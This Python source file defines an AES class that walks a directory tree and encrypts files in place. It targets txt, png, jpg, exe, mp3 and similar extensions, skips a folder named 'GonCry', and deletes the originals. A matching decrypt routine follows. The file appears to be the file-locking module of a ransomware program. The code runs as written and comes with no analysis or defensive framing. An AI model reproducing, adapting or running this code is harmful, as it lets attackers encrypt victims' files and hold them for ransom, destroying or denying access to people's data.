import pyAesCrypt as aes
import uuid
import os


class AES:
    def __init__(self, key):
        self.key = key
        self.buffer_size = 64 * 1024
        self.file_targets = ['txt', 'img', 'png', 'jpg', 'exe', 'mp3']

    def encrypt_root(self, root_dir):
        for root, _, files in os.walk(root_dir):
            for file in files:
                abspath = os.path.join(root, file)

                if 'GonCry' in root.split('\\'):
                    continue

                if not abspath.split('.')[-1] in self.file_targets:
                    continue

                self.encrypt(abspath)

    def decrypt_root(self, root_dir):
        for root, _, files in os.walk(root_dir):
            for file in files:
                abspath = os.path.join(root, file)

                if 'GonCry' in root.split('\\'):
                    continue

                if not abspath.split('.')[-1] in self.file_targets:
                    continue

                self.decrypt(abspath)

    def encrypt(self, file):
        id_ = str(uuid.uuid4()) + file.split('.')[-1]

        while id_ in os.listdir('.'):
            id_ = str(uuid.uuid4()) + file.split('.')[-1]

        aes.encryptFile(file, id_, self.key, self.buffer_size)

        os.remove(file)

        os.rename(id_, file)

    def decrypt(self, file):
        id_ = str(uuid.uuid4()) + file.split('.')[-1]

        while id_ in os.listdir('.'):
            id_ = str(uuid.uuid4()) + file.split('.')[-1]

        aes.decryptFile(file, id_, self.key, self.buffer_size)

        os.remove(file)

        os.rename(id_, file)
